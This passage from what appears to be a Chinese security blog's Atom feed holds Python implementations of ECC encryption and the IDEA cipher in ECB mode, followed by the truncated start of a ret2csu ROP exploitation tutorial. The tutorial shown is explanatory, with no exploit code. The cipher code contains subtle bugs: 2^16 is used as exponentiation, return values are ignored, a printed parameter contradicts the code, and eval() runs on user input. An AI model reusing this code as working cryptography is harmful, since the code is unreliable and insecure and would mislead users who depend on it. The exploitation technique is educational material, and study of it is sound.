    <updated>2020-10-26T09:25:15.738Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 辗转相除求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_fac</span><span class="params">( a, b )</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b !=  <span class="number">0</span>:</span><br><span class="line">        result = div_fac( b, a % b )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = a</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将负数结果转化为正数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_neg</span><span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="keyword">while</span> a &lt;= <span class="number">0</span>:</span><br><span class="line">        a += b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用勒让德符号和二次互反律判断平方剩余是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Leg_Prime</span><span class="params">( a , p )</span>:</span></span><br><span class="line">    a = a % p  </span><br><span class="line">    flag = <span class="number">1</span> ; a_x = [] ; i = <span class="number">2</span> ; tmp = a</span><br><span class="line">    <span class="keyword">while</span> i &lt; tmp ** <span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp % i == <span class="number">0</span>:</span><br><span class="line">            tmp //= i</span><br><span class="line">            a_x.append(i)</span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a_x.append(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a_x:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">1</span> <span class="keyword">or</span> p % <span class="number">8</span> == <span class="number">7</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">-1</span> <span class="keyword">or</span> a == p<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( <span class="number">-1</span> )</span><br><span class="line">        <span class="comment">#flag_tmp = ( -1 ) ** (( a - 1 ) * ( p - 1 ) / 4) * Leg_Prime( p % i , i )</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag *= ( ( <span class="number">-1</span> ) ** (( a - <span class="number">1</span> ) * ( p - <span class="number">1</span> ) / <span class="number">4</span> ) ) * Leg_Prime( p , i )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># ECC加密中的加法运算实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Add</span><span class="params">( A , B , p , a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> A != B:</span><br><span class="line">        dx = A[<span class="number">0</span>] - B[<span class="number">0</span>]</span><br><span class="line">        dy = A[<span class="number">1</span>] - B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dy = <span class="number">3</span> * ( A[<span class="number">0</span>] ** <span class="number">2</span> ) + a</span><br><span class="line">        dx = <span class="number">2</span> * A[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> dx == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    fac = div_fac( dx , dy )</span><br><span class="line">    dy //= fac</span><br><span class="line">    dx //= fac</span><br><span class="line">    tmp = dy % p</span><br><span class="line">    check_neg( tmp , p )</span><br><span class="line">    <span class="keyword">while</span> tmp % dx != <span class="number">0</span>:</span><br><span class="line">        tmp += p</span><br><span class="line">    k = tmp // dx</span><br><span class="line">    C_x = ( k ** <span class="number">2</span> - A[<span class="number">0</span>] - B[<span class="number">0</span>] ) % p</span><br><span class="line">    check_neg( C_x , p )</span><br><span class="line">    C_y = ( k * ( A[<span class="number">0</span>] - C_x ) - A[<span class="number">1</span>] ) % p</span><br><span class="line">    check_neg( C_y , p )</span><br><span class="line">    <span class="keyword">return</span> (C_x,C_y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基点的阶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_Order</span><span class="params">( G , p , a )</span>:</span></span><br><span class="line">    flag = <span class="number">1</span> ; A = G ; B = G</span><br><span class="line">    <span class="keyword">while</span> flag :</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> (( A[<span class="number">0</span>] ** <span class="number">3</span> + A[<span class="number">0</span>] + <span class="number">1</span> ) % p ) == (( A[<span class="number">1</span>] ** <span class="number">2</span> ) % p ):</span><br><span class="line">            <span class="keyword">if</span> A[<span class="number">0</span>] == G[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> flag + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Error!!!"</span>)</span><br><span class="line">            print(<span class="string">"在第 "</span> + str(flag) + <span class="string">" 次运算后结果错误！"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求取公钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_PublickeyFind</span><span class="params">(p,a,G,d)</span>:</span></span><br><span class="line">    A = G ; B = G</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; d:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> A == <span class="number">0</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            A = G</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文嵌入曲线</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_M</span><span class="params">(m,p,a,b)</span>:</span></span><br><span class="line">    M = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m.encode(<span class="string">'utf-8'</span>):</span><br><span class="line">        j = j * <span class="number">30</span></span><br><span class="line">        tmp = <span class="number">0</span> ; flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> tmp &lt; <span class="number">100</span>:</span><br><span class="line">            x = j + tmp</span><br><span class="line">            y_2 = ( x ** <span class="number">3</span> + a * x + b ) % p</span><br><span class="line">            tmp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> Leg_Prime( y_2 , p ) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,p):</span><br><span class="line">                    <span class="keyword">if</span> ( i ** <span class="number">2</span> - y_2 ) % p == <span class="number">0</span>:</span><br><span class="line">                        M.append(( x , i ))</span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"明文某字节在嵌入曲线时 100 次没有得到平方剩余"</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_encode</span><span class="params">(M,G,K,r,p,a)</span>:</span></span><br><span class="line">    r_G = ECC_PublickeyFind(p,a,G,r)</span><br><span class="line">    r_K = ECC_PublickeyFind(p,a,K,r)</span><br><span class="line">    C_1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> M:</span><br><span class="line">        C_1.append(ECC_Add(i,r_K,p,a))</span><br><span class="line">    print(<span class="string">"C1为:"</span>,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C_1:</span><br><span class="line">        print(str(i) + <span class="string">','</span> ,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print()</span><br><span class="line">    print(<span class="string">"C2为:"</span> + str(r_G))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Encrypt</span><span class="params">(p,a,b,G,n,d,m)</span>:</span></span><br><span class="line">    K = ECC_PublickeyFind(p,a,G,d)</span><br><span class="line">    print(<span class="string">"公钥为："</span> + str(K))</span><br><span class="line">    M = ECC_M(m,p,a,b)</span><br><span class="line">    r = random.randint(<span class="number">1</span>,n<span class="number">-1</span>)</span><br><span class="line">    ECC_encode(M,G,K,r,p,a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Decrypt</span><span class="params">(C1,C2,d,p,a)</span>:</span></span><br><span class="line">    C2_tmp = ECC_PublickeyFind(p,a,C2,d)</span><br><span class="line">    C2 = (C2_tmp[<span class="number">0</span>],-C2_tmp[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C1:</span><br><span class="line">        M = ECC_Add(i,C2,p,a)[<span class="number">0</span>] // <span class="number">30</span></span><br><span class="line">        print(chr(M),end=<span class="string">''</span>)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p,a,b,G,n = <span class="number">4177</span>,<span class="number">1</span>,<span class="number">1</span>,(<span class="number">0</span>,<span class="number">1</span>),<span class="number">28</span></span><br><span class="line">    print(<span class="string">"本程序使用曲线方程为：y^2 = x^3 + x + 1"</span>)</span><br><span class="line">    print(<span class="string">"参数 p 选择为 23，基点为 (0,1), n 为 28"</span>)</span><br><span class="line">    print(<span class="string">"为减小计算压力，本程序为ASCII字符集逐字节加密"</span>)</span><br><span class="line">    d = eval(input(<span class="string">"请输入私钥："</span>))</span><br><span class="line">    m = input(<span class="string">"请输入要加密的数据："</span>)</span><br><span class="line"></span><br><span class="line">    ECC_Encrypt(p,a,b,G,n,d,m)</span><br><span class="line"></span><br><span class="line">    C1 = eval(input(<span class="string">"请输入C1:"</span>))</span><br><span class="line">    C2 = eval(input(<span class="string">"请输入C2:"</span>))</span><br><span class="line"></span><br><span class="line">    ECC_Decrypt(C1,C2,d,p,a)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>(密码学)(crypto)IDEA_Crypto(ECB模式)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)IDEA_Crypto(ECB)/</id>
    <published>2020-04-29T17:10:44.768Z</published>
    <updated>2020-10-26T09:25:15.739Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="python"><span class="comment"># -*- coding:utf-8 -*-</span><span class="function"><span class="keyword">def</span> <span class="title">FindMODreverse</span><span class="params">(a,m)</span>:</span>                        <span class="comment"># 欧几里得除法求模逆元</span>    m_tmp = m    x_1,x_2 = <span class="number">1</span>,<span class="number">0</span>    y_1,y_2 = <span class="number">0</span>,<span class="number">1</span>    <span class="keyword">while</span> m != <span class="number">0</span>:        q = a//m        x_2,y_2,m,x_1,y_1,a = (x_1 - q * x_2),(y_1 - q * y_2),a % m,x_2,y_2,m    <span class="keyword">while</span> x_1 &lt; <span class="number">0</span>:        x_1 += m_tmp    <span class="keyword">while</span> x_1 &gt;= m_tmp:        x_1 -= m_tmp    <span class="keyword">return</span> x_1<span class="function"><span class="keyword">def</span> <span class="title">ROL</span><span class="params">(lit,num)</span>:</span>                               <span class="comment"># 循环左移 num 位</span>    <span class="keyword">return</span> lit[num:] + lit[:num]<span class="function"><span class="keyword">def</span> <span class="title">idea_xor</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 逐位异或</span>    tmp = <span class="string">''</span> ; i = <span class="number">0</span>    <span class="keyword">while</span> <span class="literal">True</span>:        <span class="keyword">try</span>:            tmp += str(int(x[i],<span class="number">2</span>)^int(y[i],<span class="number">2</span>))            i += <span class="number">1</span>        <span class="keyword">except</span>:            <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_add</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65536相加</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    z = ( x + y ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_mul</span><span class="params">(x,y)</span>:</span>                              <span class="comment"># 模65537相乘</span>    x = int(x,<span class="number">2</span>) ; y = int(y,<span class="number">2</span>)    <span class="keyword">if</span> x == <span class="number">0</span>:        x = <span class="number">2</span>^<span class="number">16</span>    <span class="keyword">if</span> y == <span class="number">0</span>:        y = <span class="number">2</span>^<span class="number">16</span>    z = ( ( x * y ) % <span class="number">65537</span> ) % <span class="number">65536</span>    z = bin(z)[<span class="number">2</span>:]    tmp = <span class="string">'0'</span>*(<span class="number">16</span> - len(z)) + z    <span class="keyword">return</span> tmp<span class="function"><span class="keyword">def</span> <span class="title">idea_encode</span><span class="params">(m,num,key)</span>:</span>                     <span class="comment"># 加密过程</span>    x_array = [m[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]    z_array = key[num*<span class="number">6</span>:num*<span class="number">6</span>+<span class="number">6</span>]    <span class="keyword">if</span> num &lt; <span class="number">8</span>:        out_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        out_2 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">1</span>])        out_3 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">2</span>])        out_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        out_5 = idea_mul(z_array[<span class="number">4</span>],idea_xor(out_1,out_3))        out_6 = idea_mul(z_array[<span class="number">5</span>],idea_add(idea_xor(out_2,out_4),out_5))        out_7 = idea_add(out_5,out_6)        w_1 = idea_xor(out_1,out_6)        w_2 = idea_xor(out_3,out_6)        w_3 = idea_xor(out_2,out_7)        w_4 = idea_xor(out_4,out_7)        c = w_1 + w_2 + w_3 + w_4        num += <span class="number">1</span>        c = idea_encode(c,num,key)    <span class="keyword">else</span>:        y_1 = idea_mul(x_array[<span class="number">0</span>],z_array[<span class="number">0</span>])        y_2 = idea_add(x_array[<span class="number">2</span>],z_array[<span class="number">1</span>])        y_3 = idea_add(x_array[<span class="number">1</span>],z_array[<span class="number">2</span>])        y_4 = idea_mul(x_array[<span class="number">3</span>],z_array[<span class="number">3</span>])        c = y_1 + y_2 + y_3 + y_4    <span class="keyword">return</span> c<span class="function"><span class="keyword">def</span> <span class="title">IDEA_Crypto</span><span class="params">(cm_str,key,mode)</span>:</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">if</span> len(cm_str) % <span class="number">8</span> != <span class="number">0</span>:                         <span class="comment"># 对明文进行填充</span>            cm_str += <span class="string">'\x00'</span> * ( <span class="number">8</span> - len(cm_str) % <span class="number">8</span> )        m_bin = <span class="string">''</span>                                       <span class="comment"># 将明文转化为二元序列</span>        <span class="keyword">for</span> i <span class="keyword">in</span> cm_str.encode(<span class="string">'utf-8'</span>):            i = bin(i)[<span class="number">2</span>:]            m_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    <span class="keyword">else</span>:                                                <span class="comment"># 将密文转化为二元序列</span>        c_bin = bin(int(cm_str,<span class="number">16</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(c_bin) % <span class="number">8</span> != <span class="number">0</span>:            c_bin = <span class="string">'0'</span>*(<span class="number">8</span> - (len(c_bin) % <span class="number">8</span>)) + c_bin    key_bin = <span class="string">''</span>                                         <span class="comment"># 将密钥转化为二元序列</span>    <span class="keyword">for</span> i <span class="keyword">in</span> key.encode(<span class="string">'utf-8'</span>):        i = bin(i)[<span class="number">2</span>:]        key_bin += <span class="string">'0'</span>*(<span class="number">8</span> - len(i)) + i    key_encrypt_array = []                                       <span class="comment"># 生成加密子密钥</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):        <span class="keyword">for</span> j <span class="keyword">in</span> [key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)]:            key_encrypt_array.append(j)        key_bin = ROL(key_bin,<span class="number">25</span>)    <span class="keyword">else</span>:        key_encrypt_array.extend([key_bin[k*<span class="number">16</span>:k*<span class="number">16</span>+<span class="number">16</span>] <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>)][:<span class="number">4</span>])    key_decrypt_array = [] ; flag = <span class="number">0</span>                            <span class="comment"># 生成解密子密钥</span>    key_tmp_array = key_encrypt_array[::<span class="number">-1</span>]    <span class="keyword">for</span> i <span class="keyword">in</span> [key_tmp_array[i*<span class="number">6</span>:i*<span class="number">6</span>+<span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]:        i[:<span class="number">4</span>] = i[<span class="number">3</span>::<span class="number">-1</span>] ; i[<span class="number">-2</span>:] = i[:<span class="number">-3</span>:<span class="number">-1</span>]        <span class="keyword">if</span> flag == <span class="number">0</span>:                                            <span class="comment"># 第一轮和最后一轮的第二三子密钥特殊取值</span>            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            flag += <span class="number">1</span>        <span class="keyword">else</span>:            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_1 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]            tmp_2 = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev            i[<span class="number">1</span>] = tmp_2            i[<span class="number">2</span>] = tmp_1        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">else</span>:                                                       <span class="comment"># 最后一轮第九轮的解密密钥</span>        i = key_tmp_array[<span class="number">-4</span>:][::<span class="number">-1</span>]        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">1</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">1</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Addrev = bin((<span class="number">65536</span> - int(i[<span class="number">2</span>],<span class="number">2</span>)) % <span class="number">65536</span>)[<span class="number">2</span>:]        i[<span class="number">2</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Addrev)) + Addrev        Modrev = bin(FindMODreverse(int(i[<span class="number">0</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">0</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        Modrev = bin(FindMODreverse(int(i[<span class="number">3</span>],<span class="number">2</span>),<span class="number">65537</span>))[<span class="number">2</span>:]        i[<span class="number">3</span>] = <span class="string">'0'</span>*(<span class="number">16</span>-len(Modrev)) + Modrev        key_decrypt_array.extend(i)    <span class="keyword">if</span> mode == <span class="number">0</span>:                                   <span class="comment"># 文本二元序列的分组</span>        mc_array = [ m_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m_bin) / <span class="number">64</span>)) ]      <span class="keyword">else</span>:        mc_array = [ c_bin[i*<span class="number">64</span>:i*<span class="number">64</span>+<span class="number">64</span>] \            <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(c_bin) / <span class="number">64</span>)) ]    cm_array = []                                   <span class="comment"># 求结果分组</span>    <span class="keyword">if</span> mode == <span class="number">0</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_encrypt_array))    <span class="keyword">else</span>:        <span class="keyword">for</span> i <span class="keyword">in</span> mc_array:            cm_array.append(idea_encode(i,<span class="number">0</span>,key_decrypt_array))    cm = <span class="string">''</span>                                      <span class="comment"># 将结果分组转换为对应的十六进制内容</span>    <span class="keyword">for</span> i <span class="keyword">in</span> cm_array:        tmp = hex(int(i,<span class="number">2</span>))[<span class="number">2</span>:]        <span class="keyword">if</span> len(tmp) * <span class="number">4</span> != len(i):            tmp = <span class="string">'0'</span>*int(len(i) / <span class="number">4</span> - len(tmp)) + tmp        cm += tmp    <span class="keyword">if</span> mode == <span class="number">0</span>:        print(<span class="string">'密文：'</span> + cm)    <span class="keyword">else</span>:        print(<span class="string">'明文(hex):'</span> + cm)    <span class="keyword">return</span> cm<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:    m = <span class="string">'1234567812345678'</span>    key = <span class="string">'1234567812345678'</span>    c = IDEA_Crypto(m,key,<span class="number">0</span>)    m_tmp = IDEA_Crypto(c,key,<span class="number">1</span>)<span class="string">'''</span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="http://xibai.xyz/tags/Crypto/"/>
    
      <category term="python" scheme="http://xibai.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-3.2(ROP-Intermediate)</title>
    <link href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/"/>
    <id>http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/</id>
    <published>2020-04-24T07:52:13.108Z</published>
    <updated>2020-11-01T19:07:16.662Z</updated>
    
    <content type="html"><![CDATA[<p>前面介绍了栈溢出的基础操作，现在开始应该才算是入门操作了</p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道64位的程序，其函数传参时六个参数以内是通过<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。也就是如果对64位程序进行栈溢出攻击时，我们不是仅仅在栈上布置输入的数据，我们还要找到可以控制以上六个寄存器的<code>gadgets</code>，而正常情况下我们是很难找到六个寄存器各自对应的<code>gadgets</code>。这个时候，就需要用到<code>__libc_csu_init</code>这个函数了。一般情况下的程序在编译时，编译器会自动调用该函数来完成对<code>libc</code>的初始化操作。也就是大多数程序虽然在编写的时候没有用到该函数，但是编译器会自动为其添加该函数，这些程序也因此都会有这个函数。</p><p>下面是我编译的程序反汇编后看到的这个函数的内容：(听说这玩意有很多不同版本，会有一些细节上的不一样，不过大同小异)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0000000000401190 &lt;__libc_csu_init&gt;:</span><br><span class="line">  401190: 41 57                 push   r15</span><br><span class="line">  401192: 4c 8d 3d df 1f 00 00  lea    r15,[rip+0x1fdf]        # 403178 